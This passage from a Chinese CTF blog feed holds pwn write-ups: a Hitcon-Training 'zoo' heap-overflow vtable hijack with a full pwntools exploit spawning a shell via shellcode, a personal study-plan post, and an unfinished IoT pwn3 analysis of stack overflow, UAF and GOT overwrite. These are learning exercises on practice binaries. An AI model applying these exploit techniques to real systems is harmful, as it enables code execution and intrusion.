class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+fake_io+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x238</span>)+sc)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* setcontext+53')</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF writeup</category>
      </categories>
  </entry>
  <entry>
    <title>zoo</title>
    <url>/2020/09/03/zoo/</url>
    <content><![CDATA[<h1 id="zoo"><a href="#zoo" class="headerlink" title="zoo"></a>zoo</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷到最后还是没能做出最后一题，第一次做C++的题，感觉自己太菜了，代码都读不懂，继续努力吧X</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>IDA的逆向代码就不贴了，直接看下源代码，父类是Animal，其成员变量为name[24]和weight，此外还有两个虚函数，speak()和info()。Dog和Cat继承了Animal,各自实现了自己的speak和info</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> nameofzoo[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Animal()&#123;</span><br><span class="line">			<span class="built_in">memset</span>(name,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line">			weight = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;;&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;;&#125;</span><br><span class="line">	<span class="keyword">protected</span> :</span><br><span class="line">		<span class="keyword">char</span> name[<span class="number">24</span>];</span><br><span class="line">		<span class="keyword">int</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Dog(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line">			<span class="built_in">strcpy</span>(name,str.c_str());	</span><br><span class="line">			weight = w ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow ~ Wow ~ Wow ~"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"| Animal info         |"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"  Weight :"</span> &lt;&lt; <span class="keyword">this</span>-&gt;weight &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"  Name : "</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Cat(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line">			<span class="built_in">strcpy</span>(name,str.c_str());</span><br><span class="line">			weight = w ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"Meow ~ Meow ~ Meow ~"</span> &lt;&lt; <span class="built_in">endl</span> ;			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"| Animal info         |"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"  Weight :"</span> &lt;&lt; <span class="keyword">this</span>-&gt;weight &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"  Name : "</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;Animal *&gt; animallist ;</span><br></pre></td></tr></table></figure>
<p>adddog()函数首先分配一个Dog()，之后读取Name，但是没有限制长度，导致构造函数里的strcpy溢出name，Cat同理，他们的地址存放在animallist里</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">adddog</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> name ;</span><br><span class="line">	<span class="keyword">int</span> weight ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Name : "</span> ;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Weight : "</span> ;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; weight ;</span><br><span class="line">	Dog *mydog = <span class="keyword">new</span> Dog(name,weight);</span><br><span class="line">	animallist.push_back(mydog);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>remove()函数delete相应对象并把list清空</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">if</span>(animallist.size() == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"no any animal!"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"index of animal : "</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; idx ;</span><br><span class="line">	<span class="keyword">if</span>(idx &gt;= animallist.size())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"out of bound !"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span> animallist[idx];</span><br><span class="line">	animallist.erase(animallist.begin()+idx);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>showinfo()函数调用对象里的虚函数info()</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showinfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">if</span>(animallist.size() == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"no any animal!"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"index of animal : "</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; idx ;</span><br><span class="line">	<span class="keyword">if</span>(idx &gt;= animallist.size())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"out of bound !"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	animallist[idx]-&gt;info();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>listn()函数调用对象里的虚函数speak()</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listen</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">if</span>(animallist.size() == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"no any animal!"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"index of animal : "</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; idx ;</span><br><span class="line">	<span class="keyword">if</span>(idx &gt;= animallist.size())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"out of bound !"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	animallist[idx]-&gt;speak();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数先让用户输入数据到bss段上，之后选择功能执行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> choice ;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Name of Your zoo :"</span> ;</span><br><span class="line">	read(<span class="number">0</span>,nameofzoo,<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Your choice :"</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; choice ;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">				adddog();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">				addcat();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">				listen();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span> : </span><br><span class="line">				showinfo();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span> :</span><br><span class="line">				remove();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span> :</span><br><span class="line">				_exit(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">default</span> :</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"Invaild choice"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>按照刚才函数的分析，adddog和addcat里存在堆溢出，c++的虚函数调用机制是每一个new的类里的fd都执行vtable，而vatable[i]是将要调用函数的函数地址，以speak为例，这里的vtable为0x403140，其内容为speak和info的实际地址。</p>
<p><img src="/2020/09/03/zoo/1.jpg" alt="vtable"></p>
<p><img src="/2020/09/03/zoo/2.jpg" alt="vtable2"></p>
<p>我们可以先new2个chunk，利用堆溢出覆盖第二个chunk的fd为nameofzoo+len(shellcode)的地址，nameofzoo的数据为shellcode+nameofzoo_addr.当我们调用listen(0)的时候，实际上调用的是chunk2-&gt;nameofzoo_addr+len(shellcode)(因为push的缘故)，在这里函数又找到了nameofzoo_addr作为自己的函数实际执行地址，执行speak实际执行了shellocde，这个过程可以借用一张图来说明</p>
<p><img src="/2020/09/03/zoo/3.jpg" alt="chunk"></p>
<p><img src="/2020/09/03/zoo/4.png" alt="shellcode"></p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./zoo'</span>)</span><br><span class="line"><span class="comment">#elf = ELF('./magicheap')</span></span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddDog</span><span class="params">(name,weight)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'Weight : '</span>)</span><br><span class="line">    p.send(weight)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Listen</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index of animal : '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index of animal : '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    vtable_addr = <span class="number">0x403140</span></span><br><span class="line">    nameofzoo_addr = <span class="number">0x605420</span></span><br><span class="line">    p.recvuntil(<span class="string">'Name of Your zoo :'</span>)</span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    p.sendline(shellcode+p64(nameofzoo_addr))</span><br><span class="line">    AddDog(<span class="string">'1'</span>*<span class="number">7</span>+<span class="string">'\n'</span>,<span class="string">'0\n'</span>)</span><br><span class="line">    AddDog(<span class="string">'2'</span>*<span class="number">7</span>+<span class="string">'\n'</span>,<span class="string">'1\n'</span>)</span><br><span class="line">    Remove(<span class="number">0</span>)</span><br><span class="line">    AddDog(<span class="string">'3'</span>*<span class="number">0x48</span>+p64(nameofzoo_addr+len(shellcode))+<span class="string">'\n'</span>,<span class="string">'2\n'</span>)</span><br><span class="line">    Listen(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/3902#toc-20" target="_blank" rel="noopener">先知</a><br><a href="http://showlinkroom.me/2017/08/21/C-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">c++虚表机制</a></p>
]]></content>
      <categories>
        <category>Hitcon-Training</category>
      </categories>
  </entry>
  <entry>
    <title>起点</title>
    <url>/2020/09/03/%E8%B5%B7%E7%82%B9/</url>
    <content><![CDATA[<h2 id="主要方向"><a href="#主要方向" class="headerlink" title="主要方向"></a>主要方向</h2><p>马上大四，才发现和身边人的差距已经大到无法想象，上大学以来一直没有一个长远的目标，学什么都浅尝辄止，研究生的事情也没有花很多心思打听和考虑。家人和亲戚都觉得研究生要上一个更好的学校，我理解这种想法，但是我真的很想打CTF。尤其是大二那两天只做出来了一道简单的逆向题让我觉得和身边人差得太远，加之小学期C老师的一节课让我很有好感。所以最后还是选择二进制，最后和C老师聊的时候他说厉害的人都做二进制，挖漏洞。从就业的角度来说web和移动端更容易入门，选择更多，未来转方向也更容易。不过还是想研究底层的东西，万变不离其宗，多了解一些未来转方向也是容易转的，希望汇编不会限制了我的眼界<br><br><br>下面是主攻的方向</p>
<ul>
<li>二进制</li>
<li>PWN</li>
<li>机器学习</li>
</ul>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><ol>
<li>gdb调试、ida逆向</li>
<li>PWN常见漏洞</li>
<li>脚本编写</li>
<li>intel pin动态插桩</li>
<li>汇编看完</li>
<li>js入门，装饰好blog</li>
</ol>
<h2 id="其他任务"><a href="#其他任务" class="headerlink" title="其他任务"></a>其他任务</h2><ul>
<li>健身</li>
<li>写博客</li>
<li>多出去走走</li>
</ul>
<blockquote>
<p>Talking is cheap, show me the code.</p>
</blockquote>
<p><img src="https://ama2in9.top/images/dubhe.jpg" alt="Dubhe"></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>西湖论剑IoT &amp;&amp; X-NUCA &amp;&amp; KCTF Q3</title>
    <url>/2020/12/19/xihulunjian/</url>
    <content><![CDATA[<h1 id="西湖论剑IoT-amp-X-NUCA-amp-amp-KCTF-Q3"><a href="#西湖论剑IoT-amp-X-NUCA-amp-amp-KCTF-Q3" class="headerlink" title="西湖论剑IoT &amp;　X-NUCA &amp;&amp; KCTF Q3"></a>西湖论剑IoT &amp;　X-NUCA &amp;&amp; KCTF Q3</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>杂记，整理一下最近做的题，发完这篇博客就去做项目:D。西湖论剑的题里pwn2、pwn3是可以本地模拟起来的，本来想都做下，不过项目/论文太忙没时间做pwn2了，考的是协议字段的分析，看着还是蛮不错的，以后有空再说好了。</p>
<h2 id="西湖论剑IoT-pwn3"><a href="#西湖论剑IoT-pwn3" class="headerlink" title="西湖论剑IoT-pwn3"></a>西湖论剑IoT-pwn3</h2><h3 id="漏洞分析-amp-amp-漏洞利用"><a href="#漏洞分析-amp-amp-漏洞利用" class="headerlink" title="漏洞分析 &amp;&amp; 漏洞利用"></a>漏洞分析 &amp;&amp; 漏洞利用</h3><p>程序开始的registered函数存在溢出，不过因为程序的text地址是0x000106a0，很多gadget都被截断了，这里的溢出不是很好用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">registered</span><span class="params">(<span class="keyword">char</span> *name, <span class="keyword">char</span> *pwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> *pwd1; <span class="comment">// [sp+0h] [bp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> *name1; <span class="comment">// [sp+4h] [bp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [sp+8h] [bp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [sp+30h] [bp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [sp+58h] [bp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [sp+6Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  name1 = name;</span><br><span class="line">  pwd1 = pwd;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please registered account \nInput your username:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, &amp;src);                    <span class="comment">// 溢出</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input password:"</span>);</span><br><span class="line">  getpasswd((<span class="keyword">int</span>)&amp;s1, <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;s1; *i != <span class="number">10</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  *i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease input password again:"</span>);</span><br><span class="line">  getpasswd((<span class="keyword">int</span>)&amp;s2, <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;s2; *i != <span class="string">'\n'</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  *i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, &amp;s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nPassword wrong"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(name1, &amp;src);</span><br><span class="line">  <span class="built_in">strcpy</span>(pwd1, &amp;s2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nSuccess!\n "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nPress any key continue ..."</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续往后看，一个菜单题，在modify中输入0x48字节数据到passwd，这里存在溢出，因其距离main_ebp为0x40。info函数可以将pwd内容输出，这里调试一下发现modify输入时栈上脏数据包含strtol+40的libc地址，通过strncpy拷贝到pwd在info输出即可leak libc，同理可以泄露栈地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> pwd; <span class="comment">// [sp+4h] [bp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> name; <span class="comment">// [sp+2Ch] [bp-18h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  registered(&amp;name, &amp;pwd);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( getchoice() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        play();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        info(&amp;name, &amp;pwd);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        modify(&amp;pwd);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Wrong try again!!"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">modify</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Ch] [bp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+54h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = a1;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease Input new password:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x48</span>u);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, &amp;buf, <span class="number">0x48</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nPress any key continue ..."</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察一下长须退出时的汇编，由于我们泄露出了栈地址，因此控制r11(fp)之后再次跳转到0x10f0c来控制sp到输入的开头，进而执行栈上的rop get shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00010F08 loc_10F08                               ; CODE XREF: main+84↑j</span><br><span class="line">.text:00010F08                 MOV     R0, R3</span><br><span class="line">.text:00010F0C                 SUB     SP, R11, #4</span><br><span class="line">.text:00010F10                 LDMFD   SP!, &#123;R11,PC&#125;</span><br></pre></td></tr></table></figure>
<p>继续看，play这个子菜单里还包含了add/delete两个函数,存在很明显的UAF漏洞。之前一直以为这个题是awd因此leak不再使用之前的洞。使用double free控制atoi@got为printf@plt泄露出libc，之后printf的返回值将作为atoi的返回值，这里read的范围是0-8因此我们操作sz为4，idx为0-8的chunk修改free@got为system@libc，释放包含binsh的chunk即可(或许使用<code>printf(&quot;%12c&quot;)</code>等可以返回大于8的值不过我没测试了)。</p>
<p>原题的环境是2.30，我这里是18.04做的，uClibc的保护机制比x86的少很多，比如malloc到某个块时不会对sz做检查，有兴趣的可以详细看看源码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// [sp+4h] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [sp+8h] [bp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [sp+Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index: "</span>);</span><br><span class="line">  idx = getchoice();</span><br><span class="line">  v0 = a[<span class="number">2</span> * idx + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">    size = getchoice();</span><br><span class="line">    v0 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0x70</span> )</span><br><span class="line">        size = <span 